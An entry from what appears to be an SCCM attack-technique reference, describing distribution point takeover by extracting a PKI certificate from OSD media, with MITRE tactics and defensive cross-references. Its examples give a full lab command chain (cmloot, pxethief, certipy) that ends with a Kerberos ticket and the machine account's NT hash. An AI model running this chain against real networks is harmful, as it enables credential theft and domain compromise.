# ELEVATE-5

## Description
Distribution Point Takeover via OSD Media Recovery


## MITRE ATT&CK Tactics
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements
- PKI client authentication certificates are used for communication with the target distribution point
- The distribution is PXE-enabled or still hosts the OSD media boot images for PXE

One of the following:
- Connectivity to SMB on the distribution point OR
- Connectivty to HTTP(s) on the distribution point

And one of the following:
- Valid Active Directory domain credentials 
- Anonymous authentication enabled on the distribution point

## Summary
SCCM sites may optionally be configured to support public-key infrastructure (PKI) certificates for secure communications. For deployments with internet-based site systems, PKI certificates are required. When deployed, the distribution point (DP) role requires its PKI certificate to support client authentication and for the private key to be exportable. The certificate is used by the DP to support communication with HTTPS enabled management points. During OSD task sequence media, the certificate is imported where required to support HTTPS communications to management points during operating system deployment. For environments that leverage Microsoft's PKI solution Active Directory Certificate Services (AD CS), the certificate generated for the DP role may be used to authenticate as the DP's host AD machine account. An attacker who is able to successfully recover the PKI certificate from the OSD task sequence variables file contents may gain control of the certificate's AD identity.

## Impact 

 The impact of recovery is environment dependent. At a minimuim, based on Microsoft's [documentation](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/network/pki-certificate-requirements#site-systems-that-have-a-distribution-point-installed) an attacker that recovers this certificate can impersonate a DP's AD identity and compromise the host system. 

## Defensive IDs
- [DETECT-7: Monitor read access to the SMSTemp directory](../../../defense-techniques/DETECT/DETECT-7/detect-7_description.md)
- [PREVENT-6: Configure a strong PXE boot password](../../../defense-techniques/PREVENT/PREVENT-6/prevent-6_description.md)

## Examples

1. On the attacker server, using cmloot.py triage the content library for common OSD media formats like .WIM or .ISO

```
┌──(cmloot)─(root㉿sccm-kali)-[~/cmloot]
└─# python3 cmloot.py ludus.domain/domainuser:password@10.6.10.12 -cmlootinventory sccmfiles.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Access to SCCMContentLib on 10.6.10.12
[+] sccmfiles.txt created

┌──(cmloot)─(root㉿sccm-kali)-[~/cmloot]
└─# python3 cmloot.py ludus.domain/domainuser:password@10.6.10.12 -cmlootdownload sccmfiles.txt -extensions WIM ISO
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] sccmfiles.txt exists. Remove it if you want to recreate the inventory.
[+] Extensions to download ['WIM', 'ISO']
[+] Creating CMLootOut
[+] Downloaded D55D-boot.12300002.wim
[+] Downloaded 3203-win11.wim
[+] Downloaded 8A5E-prestaged.wim
```
2. Using an archiving tool such as 7zip, parse the recovered media files for and extract the Variables.dat task sequence variables file.

```
┌──(cmloot)─(root㉿sccm-kali)-[~/cmloot/CMLootOut]
└─# 7z l 8A5E-prestaged.wim|grep -i Variables.dat
2025-06-19 16:23:53 ....A        24248        24248  SMS/data/Variables.dat

```
3. Use pxethief.py to extract the PKI certificate from the recovered variables file

```
┌──(PXEThief)─(root㉿sccm-kali)-[~/cmloot/CMLootOut/SMS/data]
└─# python3 /home/kali/PXEThief/pxethief.py 3 Variables.dat

 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
          |__|/ \|__|

[+] Attempting to decrypt media variables file and retrieve policies and passwords from MECM Server...
[+] User did not supply password. Making use of default MECM media variables password (only works for non-password protected media)
[+] Media variables file to decrypt: Variables.dat
[+] Password provided: {BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}
[+] Successfully decrypted media variables file with the provided password!
[!] Writing media variables to variables.xml
[!] Writing _SMSTSMediaPFX to 123_8AE6B618-77EC-46CB-B1B5-88F693E_SMSTSMediaPFX.pfx. Certificate password is 8AE6B618-77EC-46CB-B1B5-88F693E
[+] Identifying Management Point URL from media variables (Subsequent requests may fail if DNS does not resolve!)
[+] Management Point URL set to: https://sccm-mgmt.ludus.domain
```

3. Inspect the certificate with openssl to confirm it's an AD CS certificate and contains the client authentication EKU

```
┌──(PXEThief)─(root㉿sccm-kali)-[~/cmloot/CMLootOut/SMS/data]
└─# openssl \
-in 123_8AE6B618-77EC-46CB-B1B5-88F693E_SMSTSMediaPFX.pfx \
-passin pass:8AE6B618-77EC-46CB-B1B5-88F693E \
-nokeys -clcerts | openssl x509 -text -certopt no_pubkey,no_sigdump -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            13:00:00:00:1b:3f:6d:ff:d3:07:16:36:2c:00:00:00:00:00:1b
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=domain, DC=ludus, CN=ludus-CA
        Validity
            Not Before: Jun  2 19:35:17 2025 GMT
            Not After : Jun  2 19:35:17 2026 GMT
        Subject:
        X509v3 extensions:
            Microsoft certificate template:
                0/.'+.....7.....k...............6.=...t...y..d...
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft Application Policies Extension:
                0.0
..+.......
            X509v3 Subject Key Identifier:
                62:55:1A:83:88:8E:1B:03:0C:76:2E:84:87:5F:B2:D0:27:92:2B:DB
            X509v3 Authority Key Identifier:
                74:86:80:EB:30:51:04:4D:D8:32:A0:33:7D:BB:77:24:18:C5:50:65
            X509v3 CRL Distribution Points:
                Full Name:
                  URI:ldap:///CN=ludus-CA,CN=DC01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ludus,DC=domain?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access:
                CA Issuers - URI:ldap:///CN=ludus-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ludus,DC=domain?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: critical
                DNS:sccm-distro.ludus.domain

```


4. Use certipy to authenticate on behalf of the recovered certificate's identity.

```
┌──(PXEThief)─(root㉿sccm-kali)-[~/cmloot/CMLootOut/SMS/data]
└─# certipy auth -pfx 123_8AE6B618-77EC-46CB-B1B5-88F693E_SMSTSMediaPFX.pfx -password 8AE6B618-77EC-46CB-B1B5-88F693E -dc-ip 10.6.10.10
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'sccm-distro.ludus.domain'
[*] Using principal: 'sccm-distro$@ludus.domain'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'sccm-distro.ccache'
[*] Wrote credential cache to 'sccm-distro.ccache'
[*] Trying to retrieve NT hash for 'sccm-distro$'
[*] Got hash for 'sccm-distro$@ludus.domain': aad3b435b51404eeaad3b435b51404ee:b8388cab9a861556b6132ae7e4de71c5

```


## References
- Christopher Panayi, [pxethief](https://github.com/MWR-CyberSec/PXEThief)
- Christopher Panayi, [Identifying and retrieving credentials from SCCM/MECM Task Sequences](https://www.mwrcybersec.com/research_items/identifying-and-retrieving-credentials-from-sccm-mecm-task-sequences)
- CRED-1, [Retrieve secrets from PXE boot media](../../CRED/CRED-1/cred-1_description.md)
- ELEVATE-4, [Distribution Point Takeover via PXE Boot Spoofing](../ELEVATE-4/ELEVATE-4_description.md)
- Microsoft, [PKI certificate requirements for Configuration Manager](https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/network/pki-certificate-requirements#task-sequence-media-for-deploying-operating-systems)


